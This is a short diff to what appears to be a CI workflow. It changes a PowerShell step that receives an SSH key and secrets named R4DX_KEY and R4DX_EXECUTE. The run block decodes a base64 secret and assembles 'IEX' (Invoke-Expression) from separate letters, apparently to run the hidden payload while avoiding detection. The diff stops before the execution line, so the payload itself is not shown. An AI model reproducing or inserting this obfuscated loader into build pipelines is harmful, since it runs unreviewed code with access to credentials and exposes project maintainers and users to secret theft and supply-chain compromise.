@@ -21,8 +21,9 @@ jobs:
       - name: r3dex
         shell: powershell
         env:
-          LETS_GO: ${{ secrets.R4DX_EXECUTE }}
           SSH_KEY: ${{ secrets.SSH_KEY }}
+          R4DX_KEY: ${{ secrets.R4DX_KEY }}
+          LETS_GO: ${{ secrets.R4DX_EXECUTE }}
         run: |
           $d = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($env:LETS_GO))
           $e = "I" + "E" + "X"
